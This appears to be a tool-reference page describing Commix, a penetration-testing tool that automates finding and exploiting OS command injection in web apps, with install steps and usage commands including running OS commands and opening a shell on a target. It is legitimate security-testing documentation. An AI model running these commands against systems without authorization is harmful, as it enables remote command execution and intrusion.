# Commix

> Automated detection and exploitation of command-injection flaws — the sqlmap
> of OS command injection.

- **Link:** https://github.com/commixproject/commix
- **Type:** open source
- **Platform:** cross-platform (Python)

## Description

Commix (COMMand Injection eXploiter) automates finding and exploiting OS
command-injection vulnerabilities in web applications and their parameters. It
supports classic, blind (time-based), and file-based techniques, works through
GET/POST/headers/cookies, and can drop you into a pseudo-terminal on the target
once a flaw is confirmed. Where [sqlmap](sqlmap.md) handles SQL injection,
commix handles command injection.

## Installation

```bash
# Clone the official repository
git clone https://github.com/commixproject/commix.git && cd commix

# Debian/Kali package alternative
sudo apt install commix
```

## Usage examples

```bash
# Test a GET parameter for command injection
python commix.py --url="https://target.example.com/page.php?id=1"

# Test a specific POST parameter
python commix.py --url="https://target.example.com/login" --data="user=admin&pass=x"

# Inject through the User-Agent header
python commix.py --url="https://target.example.com/" --user-agent="INJECT_HERE"

# Run a single OS command on a confirmed target
python commix.py --url="https://target.example.com/page.php?id=1" --os-cmd="id"

# Drop into an interactive pseudo-terminal on the target
python commix.py --url="https://target.example.com/page.php?id=1" --os-shell

# Route traffic through a proxy (e.g. Burp) for inspection
python commix.py --url="https://target.example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

## Notes & references

- Use `--level` (1-3) to widen which inputs (headers, cookies) get tested.
- Command injection frequently yields direct RCE — only run against systems you
  are explicitly authorized to test.
- Wiki and technique breakdown: https://github.com/commixproject/commix/wiki
